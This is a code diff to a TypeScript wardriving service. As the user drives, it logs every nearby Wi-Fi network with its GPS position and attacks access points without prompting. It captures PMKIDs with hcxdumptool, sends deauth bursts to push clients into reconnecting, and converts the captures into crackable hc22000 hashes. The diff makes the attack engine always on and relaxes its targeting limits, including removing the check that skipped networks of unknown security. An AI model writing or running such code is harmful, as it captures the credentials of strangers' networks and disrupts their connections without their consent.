@@ -11,7 +11,7 @@ import { lookupVendorOrRandom } from "../wifiradar/oui";
 import { stopWifiRadarService, startWifiRadarService } from "../wifiradar/service";
 import { getPlatformMode } from "../utils/platform-mode";
 import { DriveCapture, type DriveFrame } from "./capture";
-import { extractEapolToSession, DeauthOpRunner } from "./attack";
+import { extractEapolToSession, convertCaptureToHash, PmkidDriveRunner, writeBpfForAp, DeauthOpRunner } from "./attack";
 import { driveDb, DRIVE_SESSIONS_ROOT } from "./drive-db";
 import type { DriveStatus, DriveApView, ApSessionState } from "./types";
 
@@ -29,18 +29,18 @@ function killStrayCaptures(iface: string): Promise<void> {
 
 // ─── Policy constants (docs/wardrive.md) ───────────────────────────────
 const HOP_INTERVAL_MS = 400; // same cadence wifiradar proves works on this phy
-const MAX_ATTEMPTS = 3; // per AP per session; then it's "exhausted"
-const ATTACK_COOLDOWN_MS = 45_000; // between rounds on the SAME AP
-const RSSI_GATE_DBM = -72; // "good enough to try" while moving
-const DEAUTH_SPEED_MAX_KMH = 25; // opportunistic deauth only slow/stopped
-const MIN_EAPOL_PAIRS = 2; // real 4-way material (hcxpcapngtool reports pairs)
+const MAX_ATTEMPTS = 5; // per AP per session; then it's "exhausted"
+const ATTACK_COOLDOWN_MS = 30_000; // between rounds on the SAME AP
+const RSSI_GATE_DBM = -75; // "good enough to try" (relaxed: home tests at -55..-70 must pass)
+const PMKID_WINDOW_MS = 25_000; // hcxdumptool window per target (25s, tot rounds up)
+const DEAUTH_SPEED_MAX_KMH = 25; // deauth fallback only slow/stopped
+const MIN_EAPOL_PAIRS = 1; // PMKID counts as 1 pair; a real 4-way as 2+
 const SESSION_TICK_MS = 1_000; // status/GPS/DB cadence
 const POINT_MIN_MOVE_M = 6; // GPS track resolution (driving ~8m at 30km/h)
 const POINT_MAX_DT_MS = 20_000; // also drop a point when parked this long
-const TARGET_SCAN_INTERVAL_MS = 10_000; // pick a new attack target this often
-const TARGET_DWELL_MS = 6_000; // stay on the attack channel this long
-const DEAUTH_ROUND_WINDOW_MS = 8_000; // fire bursts spaced inside the window
-const BURST_GAP_MS = 1_200; // between bursts inside a window
+const TARGET_SCAN_INTERVAL_MS = 5_000; // pick a new attack target this often
+const ATTACK_SETTLE_MS = 2_000; // between hcxdumptool exit and discovery restart
+const BURST_GAP_MS = 1_200; // between deauth bursts inside a window
 
 function sanitizeMac(raw: string): string {
   const mac = String(raw || "").trim().toUpperCase();
@@ -116,6 +116,9 @@ export class DriveWardriveService extends EventEmitter {
   private attackBssid: string | null = null;
   private attackChannel = 0;
   private attackUntil = 0;
+  private attackMethod: "pmkid" | "deauth" = "pmkid";
+  private attackBusy = false; // an hcxdumptool/aireplay round is on the wire
+  private pmkidRunner: PmkidDriveRunner | null = null;
   private deauthRunner: DeauthOpRunner | null = null;
   private deauthTimers: ReturnType<typeof setTimeout>[] = [];
   // hcx conversions in flight (bssid -> promise) so a burst never double-
@@ -281,6 +284,9 @@ export class DriveWardriveService extends EventEmitter {
     if (this.hopTimer) return;
     this.hopTimer = setInterval(() => {
       if (!this.iface || this.channels.length === 0) return;
+      // During a PMKID round hcxdumptool owns the interface (channel +
+      // mode) — the hopper must not fight it.
+      if (this.hopTimerPause) return;
       if (this.attackBssid && Date.now() < this.attackUntil) return; // dwell
       const ch = this.channels[this.hopIndex % this.channels.length];
       this.hopIndex += 1;
@@ -317,11 +323,19 @@ export class DriveWardriveService extends EventEmitter {
           lastSeen: frame.ts,
         });
       }
-      // Persist + dedup. Hidden networks can't be matched by SSID — skipped.
+      // Persist the full historial row (mac/ssid/pos/señal/cifrado) keyed
+      // by BSSID. Hidden networks can't be matched by SSID — skipped.
       if (frame.ssid && frame.ssid !== "(oculta)") {
-        const isNew = driveDb.recordNetwork(frame.ssid, frame.security);
-        if (isNew) this.sessionNewSsids.add(frame.ssid);
-        else this.sessionNewSsids.add(frame.ssid); // seen this session either way
+        driveDb.recordNetwork({
+          bssid: frame.bssid,
+          ssid: frame.ssid,
+          security: frame.security,
+          channel: frame.channel,
+          rssi: frame.rssi,
+          lat: this.gpsLat,
+          lon: this.gpsLon,
+        });
+        this.sessionNewSsids.add(frame.ssid);
       }
       this.maybeAttack(frame.bssid);
       return;
@@ -404,10 +418,10 @@ export class DriveWardriveService extends EventEmitter {
     return st;
   }
 
-  // Called on every beacon from an AP: if the opportunistic gate is on and
-  // the AP deserves a shot, schedule an attack round.
+  // Called on every beacon from an AP: if the AP deserves a shot, schedule
+  // an attack round (PMKID primary; deauth fallback gated by speed).
   private maybeAttack(bssid: string): void {
-    if (!this.opportunisticDeauth || !this.running) return;
+    if (!this.running || this.attackBusy) return;
     if (this.attackBssid && Date.now() < this.attackUntil) return;
     const ap = this.air.get(bssid);
     if (!ap) return;
@@ -417,7 +431,6 @@ export class DriveWardriveService extends EventEmitter {
       st.status = "open";
       return;
     }
-    if (ap.security === "UNKNOWN") return; // don't shoot blind
     const ssid = ap.ssid;
     if (!ssid || ssid === "(oculta)") return;
     if (this.knownHandshakeSsids.has(ssid)) {
@@ -430,58 +443,201 @@ export class DriveWardriveService extends EventEmitter {
       return;
     }
     if (ap.bestRssi < RSSI_GATE_DBM) return; // too weak while moving
-    // GPS speed gate: deauth only when slow/stopped. No fix = no deauth
-    // (we can't know we're parked — be conservative).
-    if (this.gpsSpeed != null && this.gpsSpeed > DEAUTH_SPEED_MAX_KMH) return;
-    if (this.gpsSpeed == null && !this.demo) return;
-    // One at a time: lock the radio to the target's channel for a window.
     if (this.attackBssid) return;
     void this.attackAp(ap, st);
   }
 
+  // One attack round against ONE AP. Primary mechanism: hcxdumptool PMKID
+  // request — works with ZERO clients, no deauth noise (the AP is asked
+  // directly for the RSN IE PMKID). Fallback: directed deauth bursts to
+  // force a client to reassociate (only when slow/stopped; while driving
+  // fast the deauth would just waste the window).
+  // The continuous discovery capture (dumpcap|tshark) is PAUSED while the
+  // hcxdumptool round runs — hcxdumptool owns the interface exclusively —
+  // and restarted right after, so beacon discovery never loses more than
+  // ~30s per target.
   private async attackAp(ap: AirAp, st: ApSessionState): Promise<void> {
-    if (!this.iface || !this.running) return;
+    if (!this.iface || !this.running || this.attackBusy) return;
+    this.attackBusy = true;
     this.attackBssid = ap.bssid;
     this.attackChannel = ap.channel || this.currentChannel || 1;
-    this.attackUntil = Date.now() + TARGET_DWELL_MS + DEAUTH_ROUND_WINDOW_MS;
+    this.attackUntil = Date.now() + PMKID_WINDOW_MS + 15_000;
     st.status = "attacking";
     st.attempts += 1;
-    try {
-      await setChannel(this.iface, this.attackChannel);
-    } catch {
-      this.attackBssid = null;
-      st.status = "fresh";
-      return;
+    driveDb.recordAttempt(ap.bssid, "pmkid");
+    let capturedHere = false;
+
+    // ── 1. PMKID round: hcxdumptool + BPF for this AP ────────────────────
+    const sessionDir = this.sessionDir;
+    const ringDir = this.ringDir;
+    if (sessionDir && ringDir) {
+      const prefix = ap.bssid.replace(/:/g, "").toLowerCase();
+      const pcapngPath = path.join(sessionDir, `${prefix}-pmkid.pcapng`);
+      const bpfFile = `${pcapngPath}.bpf`;
+      const bpfPath = await writeBpfForAp(ap.bssid, bpfFile);
+      if (bpfPath) {
+        // Pause the discovery pipeline (it holds the iface in monitor mode).
+        this.capture?.stop();
+        this.capture = null;
+        this.hopTimerPause = true;
+        try {
+          capturedHere = await this.runPmkidRound(ap, pcapngPath, bpfPath, st);
+        } finally {
+          this.hopTimerPause = false;
+        }
+      } else {
+        console.warn(`[wardrive] PMKID skip ${ap.ssid}: BPF compile failed`);
+      }
+      // Restart discovery (same iface; hcxdumptool already restored managed
+      // mode — the DriveCapture re-enters monitor mode itself).
+      if (this.running) {
+        this.capture = new DriveCapture();
+        this.capture.on("frame", (frame: DriveFrame) => this.onFrame(frame));
+        this.capture.start(this.iface!, ringDir);
+      }
     }
-    // Fire one burst now, another mid-window (client-directed first).
-    const clients = [...st.clients].slice(0, 2);
-    const fire = (client: string | null) => {
-      if (!this.running || !this.iface) return;
-      this.deauthRunner?.stop();
-      this.deauthRunner = new DeauthOpRunner(this.iface, ap.bssid, client, 16);
-      this.deauthRunner.start();
-      st.lastDeauthAt = Date.now();
-    };
-    fire(clients.length > 0 ? clients[0] : null);
-    const midTimer = setTimeout(() => {
-      if (Date.now() < this.attackUntil && this.attackBssid === ap.bssid) {
-        const c = [...st.clients];
-        fire(c.length > 1 ? c[1] : null);
+
+    // ── 2. Deauth fallback: only when parked and still uncovered ─────────
+    if (!capturedHere && this.running && !st.captured && this.opportunisticDeauth) {
+      const slowEnough = this.demo || this.gpsSpeed == null || this.gpsSpeed <= DEAUTH_SPEED_MAX_KMH;
+      if (slowEnough) {
+        driveDb.recordAttempt(ap.bssid, "deauth");
+        capturedHere = await this.runDeauthRound(ap, st);
       }
-    }, BURST_GAP_MS);
-    this.deauthTimers.push(midTimer);
-    const endTimer = setTimeout(() => {
-      if (this.attackBssid !== ap.bssid) return;
-      this.stopDeauth();
-      this.attackBssid = null;
-      if (!st.captured) {
-        st.status = st.attempts >= MAX_ATTEMPTS ? "exhausted" : "attack-scheduled";
-        st.cooldownUntil = Date.now() + ATTACK_COOLDOWN_MS;
-      }
-      this.broadcastStatus();
-    }, TARGET_DWELL_MS + DEAUTH_ROUND_WINDOW_MS);
-    this.deauthTimers.push(midTimer, endTimer);
+    }
+
+    this.attackBssid = null;
+    this.attackBusy = false;
+    if (this.running && !st.captured) {
+      st.status = st.attempts >= MAX_ATTEMPTS ? "exhausted" : "attack-scheduled";
+      st.cooldownUntil = Date.now() + ATTACK_COOLDOWN_MS;
+    }
+    this.broadcastStatus();
   }
+
+  // One hcxdumptool PMKID window against ONE AP. Resolves true when the
+  // round produced an extractable capture (validated with hcxpcapngtool).
+  private async runPmkidRound(ap: AirAp, pcapngPath: string, bpfPath: string, st: ApSessionState): Promise<boolean> {
+    if (!this.sessionDir || !this.iface) return false;
+    // hcxdumptool needs the iface DOWN and NOT in monitor mode — it does
+    // its own mode/MAC/channel dance. Drop our monitor setup first.
+    await this.downIface(this.iface);
+    try {
+      fs.rmSync(pcapngPath, { force: true });
+    } catch {
+      // non-fatal
+    }
+    const runner = new PmkidDriveRunner(this.iface, ap.bssid, pcapngPath, ap.channel || 1, PMKID_WINDOW_MS, bpfPath);
+    this.pmkidRunner = runner;
+    runner.on("hit", () => {
+      // [PMKID:...] marker — give hcxdumptool a beat to write the file; the
+      // --exitoneapol flag exits on its own, stop() here is the safety net.
+      setTimeout(() => {
+        if (this.pmkidRunner === runner) runner.stop();
+      }, 2_000);
+    });
+    runner.on("log", (line: string) => {
+      if (line.includes("PMKID") || /EAPOL/i.test(line)) console.log(`[wardrive] hcx ${ap.ssid}: ${line.slice(0, 90)}`);
+    });
+    const exited = new Promise<void>((resolve) => runner.on("exit", () => resolve()));
+    console.log(`[wardrive] PMKID round → ${ap.ssid} (${ap.bssid}) ch${ap.channel} ${PMKID_WINDOW_MS}ms`);
+    runner.start();
+    await Promise.race([exited, sleep(PMKID_WINDOW_MS + 8_000)]);
+    runner.stop();
+    this.pmkidRunner = null;
+    await sleep(ATTACK_SETTLE_MS);
+    // Validate: hcxpcapngtool over the capture; ANY EAPOL/PMKID material
+    // marks this SSID captured (PMKID = 1 pair, full 4-way = 2).
+    const hashPath = pcapngPath.replace(/\.pcapng$/, ".hc22000");
+    const conv = await convertCaptureToHash(pcapngPath, hashPath);
+    if (conv.ok) {
+      st.captured = true;
+      st.eapolFrames += Math.max(conv.eapolPairs, conv.pmkidCount);
+      st.method = conv.pmkidCount > 0 ? "pmkid" : "deauth";
+      st.capFile = path.basename(pcapngPath);
+      st.hashFile = path.basename(hashPath);
+      this.markCaptured(ap, st, "pmkid", pcapngPath, hashPath);
+      return true;
+    }
+    // No PMKID from the AP (old firmware): the capture may still hold the
+    // deauth-triggered frames of a client reconnecting — leave the pcapng
+    // in the session dir for offline review, fall through to deauth.
+    return false;
+  }
+
+  // Secondary mechanism: directed deauth bursts (existing DeauthOpRunner).
+  private async runDeauthRound(ap: AirAp, st: ApSessionState): Promise<boolean> {
+    if (!this.iface || !this.running) return false;
+    st.lastDeauthAt = Date.now();
+    // Re-enter monitor mode ourselves (hcxdumptool dropped it).
+    try {
+      await enterMonitorMode(this.iface);
+    } catch (err: any) {
+      console.warn(`[wardrive] monitor re-entry failed: ${err?.message || err}`);
+      return false;
+    }
+    const clients = [...st.clients].slice(0, 2);
+    this.deauthRunner?.stop();
+    this.deauthRunner = new DeauthOpRunner(this.iface, ap.bssid, clients.length > 0 ? clients[0] : null, 16);
+    this.deauthRunner.start();
+    await sleep(10_000);
+    this.deauthRunner?.stop();
+    this.deauthRunner = null;
+    await sleep(ATTACK_SETTLE_MS);
+    // Validate from the PMKID capture's ring pcaps (the deauth-triggered
+    // 4-way frames land in the hcxdumptool pcapng we just made, or the
+    // session ring if any is still around).
+    const sessionDir = this.sessionDir;
+    const ringDir = this.ringDir;
+    if (!sessionDir) return false;
+    const hashPath = path.join(sessionDir, `${ap.bssid.replace(/:/g, "").toLowerCase()}.hc22000`);
+    const capPath = path.join(sessionDir, `${ap.bssid.replace(/:/g, "").toLowerCase()}.cap`);
+    let ok = false;
+    if (ringDir) {
+      const conv = await extractEapolToSession(ap.bssid, ringDir, sessionDir);
+      if (conv.ok && conv.eapolPairs >= MIN_EAPOL_PAIRS) {
+        ok = true;
+        st.method = "deauth";
+        await this.markCaptured(ap, st, "deauth", capPath, hashPath);
+      }
+    }
+    return ok;
+  }
+
+  private async markCaptured(
+    ap: AirAp,
+    st: ApSessionState,
+    method: string,
+    capPath: string,
+    hashPath: string,
+  ): Promise<void> {
+    const ssid = ap.ssid;
+    if (!ssid || ssid === "(oculta)") return;
+    this.knownHandshakeSsids.add(ssid);
+    this.sessionNewHandshakeSsids.add(ssid);
+    driveDb.markHandshake({
+      ssid,
+      bssid: ap.bssid,
+      security: ap.security,
+      method,
+      capFile: path.basename(capPath),
+      hashFile: path.basename(hashPath),
+      sessionDir: this.sessionDir || "",
+      sessionId: this.sessionId || "",
+      lat: this.gpsLat,
+      lon: this.gpsLon,
+    });
+    console.log(`[wardrive] HANDSHAKE ${ssid} (${ap.bssid}) via ${method}`);
+  }
+
+  private downIface(iface: string): Promise<void> {
+    return execFileAsync("sudo", ["-n", "ip", "link", "set", iface, "down"]).then(
+      () => undefined,
+      () => undefined,
+    );
+  }
+
+  private hopTimerPause = false;
 
   private stopDeauth(): void {
     for (const t of this.deauthTimers) clearTimeout(t);
@@ -635,7 +791,15 @@ export class DriveWardriveService extends EventEmitter {
           firstSeen: Date.now(),
           lastSeen: Date.now(),
         });
-        driveDb.recordNetwork(`${ssid}_${seed}`, security);
+        driveDb.recordNetwork({
+          bssid,
+          ssid: `${ssid}_${seed}`,
+          security,
+          channel: [1, 3, 6, 9, 11, 13][i % 6],
+          rssi,
+          lat: this.gpsLat,
+          lon: this.gpsLon,
+        });
         this.sessionNewSsids.add(`${ssid}_${seed}`);
       }
     }
@@ -672,11 +836,16 @@ export class DriveWardriveService extends EventEmitter {
   }
 
   private pickTarget(): void {
-    if (!this.running || !this.opportunisticDeauth) return;
+    // The attack engine is ALWAYS on during a session (the toggle only
+    // gates the deauth FALLBACK's speed limit — PMKID is a passive-ish
+    // request to the AP, no clients get hurt at any speed). Without this,
+    // parked home tests with the toggle off would never capture anything.
+    if (!this.running) return;
     if (this.demo) {
       this.demoCapture();
       return;
     }
+    if (this.attackBusy || (this.attackBssid && Date.now() < this.attackUntil)) return;
     // Prefer strong, uncovered, recently-seen APs; weak/distant ones wait.
     const candidates: { ap: AirAp; st: ApSessionState }[] = [];
     for (const [, ap] of this.air) {
@@ -846,4 +1015,7 @@ export function getDriveWardriveService(): DriveWardriveService {
 // Demo-mode re-export for the platform toggle (utils/platform-mode.ts):
 export function driveWardriveSetDemo(demo: boolean): void {
   sharedDriveWardriveService.setDemoMode(demo);
+}
+function sleep(ms: number): Promise<void> {
+  return new Promise((resolve) => setTimeout(resolve, ms));
 }
